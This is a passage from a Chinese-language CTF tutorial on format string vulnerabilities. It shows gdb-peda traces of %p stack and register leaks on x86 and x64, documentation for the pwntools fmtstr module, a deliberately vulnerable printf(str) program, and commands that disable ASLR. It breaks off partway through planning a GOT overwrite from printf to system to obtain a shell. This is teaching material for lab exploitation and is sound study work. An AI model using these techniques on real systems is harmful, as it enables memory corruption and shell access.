>
0xf7e27c25 : add eax,0x16f243
0xf7e27c2a : sub esp,0xc
0xf7e27c2d : mov eax,DWORD PTR [eax+0x124]
0xf7e27c33 : lea edx,[esp+0x14]
No argument
[------------------------------------stack----------------------
---------------]
0000| 0xffffd52c --> 0x8048520 (: add esp,0x20)
0004| 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x88888888
0008| 0xffffd534 --> 0x1
0012| 0xffffd538 --> 0x88888888
0016| 0xffffd53c --> 0xffffffff
0020| 0xffffd540 --> 0xffffd55a ("ABCD")
0024| 0xffffd544 --> 0xffffd564 --> 0xffffd538 --> 0x88888888
0028| 0xffffd548 --> 0x80481fc --> 0x38 ('8')
353
3.1.1 格式化字符串漏洞
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6
gdb-peda$ x/20x $esp
0xffffd52c: 0x08048520 0xffffd564 0x00000001
0x88888888
0xffffd53c: 0xffffffff 0xffffd55a 0xffffd564
0x080481fc
0xffffd54c: 0x080484b0 0xf7ffda54 0x00000001
0x424135d0
0xffffd55c: 0x00004443 0x00000000 0xffffd538
0xffffd539
0xffffd56c: 0xffffd53a 0xffffd53b 0x34303125
0x33312563
gdb-peda$ finish
Run till exit from #0 0xf7e27c20 in printf () from /usr/lib32/l
ibc.so.6
[----------------------------------registers--------------------
---------------]
EAX: 0x312
EBX: 0x804a000 --> 0x8049f14 --> 0x1
ECX: 0x0
EDX: 0xf7f98830 --> 0x0
ESI: 0xf7f96e68 --> 0x1bad90
EDI: 0x0
EBP: 0xffffd5f8 --> 0x0
ESP: 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x12345678
EIP: 0x8048520 (: add esp,0x20)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x8048514 : lea eax,[ebp-0x94]
0x804851a : push eax
0x804851b : call 0x8048350 
=> 0x8048520 : add esp,0x20
0x8048523 : sub esp,0xc
0x8048526 : push 0xa
354
3.1.1 格式化字符串漏洞
0x8048528 : call 0x8048370 
0x804852d : add esp,0x10
[------------------------------------stack----------------------
---------------]
0000| 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x12345678
0004| 0xffffd534 --> 0x1
0008| 0xffffd538 --> 0x12345678
0012| 0xffffd53c --> 0xffffffff
0016| 0xffffd540 --> 0xffffd55a ("ABCD")
0020| 0xffffd544 --> 0xffffd564 --> 0xffffd538 --> 0x12345678
0024| 0xffffd548 --> 0x80481fc --> 0x38 ('8')
0028| 0xffffd54c --> 0x80484b0 (: add ebx,0x1b5
0)
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x08048520 in main ()
gdb-peda$ x/20x $esp
0xffffd530: 0xffffd564 0x00000001 0x12345678
0xffffffff
0xffffd540: 0xffffd55a 0xffffd564 0x080481fc
0x080484b0
0xffffd550: 0xf7ffda54 0x00000001 0x424135d0
0x00004443
0xffffd560: 0x00000000 0xffffd538 0xffffd539
0xffffd53a
0xffffd570: 0xffffd53b 0x34303125 0x33312563
0x6e686824
最后还得强调两点：
首先是需要关闭整个系统的 ASLR 保护，这可以保证栈在 gdb 环境中和直接运
行中都保持不变，但这两个栈地址不一定相同
其次因为在 gdb 调试环境中的栈地址和直接运行程序是不一样的，所以我们需
要结合格式化字符串漏洞读取内存，先泄露一个地址出来，然后根据泄露出来
的地址计算实际地址
x86-64 中的格式化字符串漏洞
355
3.1.1 格式化字符串漏洞
在 x64 体系中，多数调用惯例都是通过寄存器传递参数。在 Linux 上，前六个参数
通过 RDI 、 RSI 、 RDX 、 RCX 、 R8 和 R9 传递；而在 Windows 中，前
四个参数通过 RCX 、 RDX 、 R8 和 R9 来传递。
还是上面的程序，但是这次我们把它编译成 64 位：
$ gcc -fno-stack-protector -no-pie fmt.c
使用 AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p. 作为输入：
gdb-peda$ n
[----------------------------------registers--------------------
---------------]
RAX: 0x0
RBX: 0x0
RCX: 0xffffffff
RDX: 0x88888888
RSI: 0x1
RDI: 0x7fffffffe3d0 ("AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.")
RBP: 0x7fffffffe460 --> 0x400660 (: push r
15)
RSP: 0x7fffffffe3c0 --> 0x4241000000000000 ('')
RIP: 0x400648 (: call 0x4004e0 )
R8 : 0x7fffffffe3c6 --> 0x44434241 ('ABCD')
R9 : 0xa ('\n')
R10: 0x7ffff7dd4380 --> 0x7ffff7dd0640 --> 0x7ffff7b9ed3a --> 0x
636d656d5f5f0043 ('C')
R11: 0x246
R12: 0x400500 (: xor ebp,ebp)
R13: 0x7fffffffe540 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x40063d : mov r8,rdi
0x400640 : mov rdi,rax
0x400643 : mov eax,0x0
356
3.1.1 格式化字符串漏洞
=> 0x400648 : call 0x4004e0 
0x40064d : mov edi,0xa
0x400652 : call 0x4004d0 
0x400657 : nop
0x400658 : leave
Guessed arguments:
arg[0]: 0x7fffffffe3d0 ("AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p."
)
arg[1]: 0x1
arg[2]: 0x88888888
arg[3]: 0xffffffff
arg[4]: 0x7fffffffe3c6 --> 0x44434241 ('ABCD')
[------------------------------------stack----------------------
---------------]
0000| 0x7fffffffe3c0 --> 0x4241000000000000 ('')
0008| 0x7fffffffe3c8 --> 0x4443 ('CD')
0016| 0x7fffffffe3d0 ("AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.")
0024| 0x7fffffffe3d8 ("%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.")
0032| 0x7fffffffe3e0 (".%p.%p.%p.%p.%p.%p.%p.")
0040| 0x7fffffffe3e8 ("p.%p.%p.%p.%p.")
0048| 0x7fffffffe3f0 --> 0x2e70252e7025 ('%p.%p.')
0056| 0x7fffffffe3f8 --> 0x1
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x0000000000400648 in main ()
gdb-peda$ x/10g $rsp
0x7fffffffe3c0: 0x4241000000000000 0x0000000000004443
0x7fffffffe3d0: 0x4141414141414141 0x70252e70252e7025
0x7fffffffe3e0: 0x252e70252e70252e 0x2e70252e70252e70
0x7fffffffe3f0: 0x00002e70252e7025 0x0000000000000001
0x7fffffffe400: 0x0000000000f0b5ff 0x00000000000000c2
gdb-peda$ c
Continuing.
AAAAAAAA0x1.0x88888888.0xffffffff.0x7fffffffe3c6.0xa.0x424100000
0000000.0x4443.0x4141414141414141.0x70252e70252e7025.0x252e70252
e70252e.
357
3.1.1 格式化字符串漏洞
可以看到我们最后的输出中，前五个数字分别来自寄存器
RSI 、 RDX 、 RCX 、 R8 和 R9 ，后面的数字才取自
栈， 0x4141414141414141 在 %8$p 的位置。这里还有个地方要注意，我们前
面说的 Linux 有 6 个寄存器用于传递参数，可是这里只输出了 5 个，原因是有一个
寄存器 RDI 被用于传递格式字符串，可以从 gdb 中看到， arg[0] 就是由
RDI 传递的格式字符串。（现在你可以再回到 x86 的相关内容，可以看到在 x86
中格式字符串通过栈传递的，但是同样的也不会被打印出来）其他的操作和 x86 没
有什么大的区别，只是这时我们就不能修改 arg2 的值了，因为它被存入了寄存
器中。
CTF 中的格式化字符串漏洞
pwntools pwnlib.fmtstr 模块
文档地址：http://pwntools.readthedocs.io/en/stable/fmtstr.html
该模块提供了一些字符串漏洞利用的工具。该模块中定义了一个类 FmtStr 和一
个函数 fmtstr_payload 。
FmtStr 提供了自动化的字符串漏洞利用：
class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, n
umbwritten=0)
execute_fmt (function)：与漏洞进程进行交互的函数
offset (int)：你控制的第一个格式化程序的偏移量
padlen (int)：在 paylod 之前添加的 pad 的大小
numbwritten (int)：已经写入的字节数
fmtstr_payload 用于自动生成格式化字符串 paylod：
pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, writ
e_size='byte')
offset (int)：你控制的第一个格式化程序的偏移量
writes (dict)：格式为 {addr: value, addr2: value2}，用于往 addr 里写入 value
358
3.1.1 格式化字符串漏洞
的值（常用：{printf_got}）
numbwritten (int)：已经由 printf 函数写入的字节数
write_size (str)：必须是 byte，short 或 int。告诉你是要逐 byte 写，逐 short
写还是逐 int 写（hhn，hn或n）
我们通过一个例子来熟悉下该模块的使用（任意地址内存读写）：fmt.c fmt
#include
void main() {
char str[1024];
while(1) {
memset(str, '\0', 1024);
read(0, str, 1024);
printf(str);
fflush(stdout);
}
}
为了简单一点，我们关闭 ASLR，并使用下面的命令编译，关闭 PIE，使得程序的
.text .bss 等段的内存地址固定：
# echo 0 > /proc/sys/kernel/randomize_va_space
$ gcc -m32 -fno-stack-protector -no-pie fmt.c
很明显，程序存在格式化字符串漏洞，我们的思路是将 printf() 函数的地址改
成 system() 函数的地址，这样当我们再次输入 /bin/sh 时，就可以获得
shell 了。
第一步先计算偏移，虽然 pwntools 中可以很方便地构造出 exp，但这里，我们还是
先演示手工方法怎么做，最后再用 pwntools 的方法。在 gdb 中，先在 main 处
下断点，运行程序，这时 libc 已经被加载进来了。我们输入 "AAAA" 试一下：
gdb-peda$ b main
...
gdb-peda$ r
...
gdb-peda$ n
[----------------------------------registers--------------------
359
3.1.1 格式化字符串漏洞
---------------]
EAX: 0xffffd1f0 ("AAAA\n")
EBX: 0x804a000 --> 0x8049f10 --> 0x1
ECX: 0xffffd1f0 ("AAAA\n")
EDX: 0x400
ESI: 0xf7f97000 --> 0x1bbd90
EDI: 0x0
EBP: 0xffffd5f8 --> 0x0
ESP: 0xffffd1e0 --> 0xffffd1f0 ("AAAA\n")
EIP: 0x8048512 (: call 0x8048370 )
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x8048508 : sub esp,0xc
0x804850b : lea eax,[ebp-0x408]
0x8048511 : push eax
=> 0x8048512 : call 0x8048370 
0x8048517 : add esp,0x10
0x804851a : mov eax,DWORD PTR [ebx-0x4]
0x8048520 : mov eax,DWORD PTR [eax]
0x8048522 : sub esp,0xc
Guessed arguments:
arg[0]: 0xffffd1f0 ("AAAA\n")
[------------------------------------stack----------------------
---------------]
0000| 0xffffd1e0 --> 0xffffd1f0 ("AAAA\n")
0004| 0xffffd1e4 --> 0xffffd1f0 ("AAAA\n")
0008| 0xffffd1e8 --> 0x400
0012| 0xffffd1ec --> 0x80484d0 (: add ebx,0x1b3
0)
0016| 0xffffd1f0 ("AAAA\n")
0020| 0xffffd1f4 --> 0xa ('\n')
0024| 0xffffd1f8 --> 0x0
0028| 0xffffd1fc --> 0x0
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x08048512 in main ()
360
3.1.1 格式化字符串漏洞
我们看到输入 printf() 的变量 arg[0]: 0xffffd1f0 ("AAAA\n") 在栈的第
5 行，除去第一个格式化字符串，即偏移量为 4。
读取重定位表获得 printf() 的 GOT 地址（第一列 Offset）：
$ readelf -r a.out
Relocation section '.rel.dyn' at offset 0x2f4 contains 2 entries
:
Offset Info Type Sym.Value Sym. Name
08049ff8 00000406 R_386_GLOB_DAT 00000000 __gmon_start__
08049ffc 00000706 R_386_GLOB_DAT 00000000 stdout@GLIBC_2.0
Relocation section '.rel.plt' at offset 0x304 contains 5 entries
:
Offset Info Type Sym.Value Sym. Name
0804a00c 00000107 R_386_JUMP_SLOT 00000000 read@GLIBC_2.0
0804a010 00000207 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0
0804a014 00000307 R_386_JUMP_SLOT 00000000 fflush@GLIBC_2.0
0804a018 00000507 R_386_JUMP_SLOT 00000000 __libc_start_mai
n@GLIBC_2.0
0804a01c 00000607 R_386_JUMP_SLOT 00000000 memset@GLIBC_2.0
在 gdb 中获得 printf() 的虚拟地址：